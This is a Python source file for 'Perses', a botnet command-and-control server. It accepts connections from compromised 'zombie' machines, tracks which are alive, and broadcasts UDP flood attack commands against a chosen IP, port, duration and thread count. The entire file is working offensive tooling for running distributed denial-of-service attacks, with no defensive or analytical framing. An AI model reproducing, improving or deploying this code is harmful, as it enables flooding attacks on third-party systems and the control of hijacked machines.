#!/usr/bin
import os
from threading import Thread
from time import sleep
import socket
import platform, signal
from typing import Union, Tuple
from lib.terminal import clear_custom, custom_banner, rgb, set_console_title
from lib.settings import get_path

commands = [
    ["attack udp <ip> <port> <time> <threads>", " "],
    ["check", "Check if zombies are still alive or not"],
    ["kill", "Stop all zombies from attacking"],
    ["list", "Show all zombies"],
    ["update", "Update the zombies list"],
    ["clear", "Clear the console"],
    ["exit", "Exit the application"]
]

#=====================================================================#

class BotnetServer():
    
    def __init__(self, connect:Tuple[str, int]=(get_path("ServerIP"), get_path("ServerPort"))):
        clear_custom()

        super().__init__()
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        
        custom_banner("Perses")
        self.all_connections = []
        self.all_address = []
        self.stop = False
        if self._bind(connect):
            while True:
                self._take_cmd()

#=====================================================================#

    def exit_gracefully(self, signum:Union[str, object]="", frame:Union[str, object]=""):
        print("\nExiting...")
        self.stop = True
        self.sock.close()
        sleep(1)
        exit(-1)

#=====================================================================#

    def _bind(self, connect:Tuple[str, int]) -> bool:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(connect)
        self.sock.listen(50)
        self.sock.settimeout(1)

        Thread(target=self.collect).start()
        Thread(target=self.check).start()
        Thread(target=self._update_title).start()
        return True

#=====================================================================#

    def _update_title(self):
        while not self.stop:
            if len(self.all_connections) >= 2:
                set_console_title(f"Perses | Botnet ({len(self.all_connections)} Clients connected!)")
            else:
                set_console_title(f"Perses | Botnet ({len(self.all_connections)} Client connected!)")                

#=====================================================================#

    def _print_help(self):
        total = 0
        print(f"{rgb(255, 255, 255, '▬'*10)}{rgb(105, 67, 171, ' Help ')}{rgb(255, 255, 255, '▬'*10)}")
        for x in commands:
            print(rgb(105, 67, 171, f"[{total}] × {commands[total][0]} | {commands[total][1]} ×"))
            total += 1
        print(f"{rgb(255, 255, 255, '▬'*10)}{rgb(105, 67, 171, ' Help ')}{rgb(255, 255, 255, '▬'*10)}")

#=====================================================================#

    def collect(self):
        while not self.stop:
            try:
                conn, address = self.sock.accept()
                self.all_connections.append(conn)
                self.all_address.append(address)
            except socket.timeout:
                continue
            except socket.error:
                continue
            except Exception as e:
                print("An Exception occurred: " + e)

#=====================================================================#

    def _take_cmd(self):
        cmd = input(rgb(105, 67, 171, f"┌── {rgb(255, 255, 255, '[')}{rgb(105, 67, 171, f'bot@perses')}{rgb(255, 255, 255, ']')}\n{rgb(105, 67, 171, f'└──────#')} "))
        if cmd == "list":
            results = ''
            for i, (ip, port) in enumerate(self.all_address):
                results = results + f'{[i]} {ip}:{port}   Connected! \n'
            if results == '':
                print(f"{rgb(255, 0, 0, '[-] There are no Clients connected!')}")
            else:
                print(f"{rgb(255, 255, 255, '▬'*10)}{rgb(105, 67, 171, ' Clients ')}{rgb(255, 255, 255, '▬'*10)}")
                print(f"{rgb(105, 67, 171, results)}")
                print(f"{rgb(255, 255, 255, '▬'*10)}{rgb(105, 67, 171, ' Clients ')}{rgb(255, 255, 255, '▬'*10)}")
        elif cmd == "help":
            self._print_help()
        elif cmd == "clear":
            clear_custom()
            custom_banner("Perses")
        elif cmd == "exit":
            self.exit_gracefully()
        elif cmd == "update":
            self.check(display=True, always=False)
        elif "attack" in cmd:
            for i, (ip, port) in enumerate(self.all_address):
                try:
                    self.all_connections[i].send(cmd.encode())
                    print(f'[+] {ip}:{port} {self.all_connections[i].recv(1024*5).decode("ascii")}')
                except BrokenPipeError:
                    del self.all_address[i]
                    del self.all_connections[i]
        elif cmd == "check" or "kill":
            for i, (ip, port) in enumerate(self.all_address):
                try:
                    self.all_connections[i].send(cmd.encode())
                    print(f'[+]{ip}:{port} {self.all_connections[i].recv(1024*5).decode("ascii")}')
                except BrokenPipeError:
                    del self.all_address[i]
                    del self.all_connections[i]
        else:
            print(f"[-] Invalid Command!")

#=====================================================================#

    def check(self, display:bool=False, always:bool=True):
        while not self.stop:
            c=0
            for n,tcp in zip(self.all_address,self.all_connections):
                c+=1
                try:
                    tcp.send(str.encode("ping"))
                    if tcp.recv(1024).decode("utf-8") and display:
                            print(f'[+]{str(n[0])+":"+str(n[1])}    LIVE')
                except:
                    if display:
                        print(f'[+]    {str(n[0])+":"+str(n[1])}    DEAD')
                    del self.all_address[c-1]
                    del self.all_connections[c-1]
                    continue
            if not always:
                break        
        sleep(1)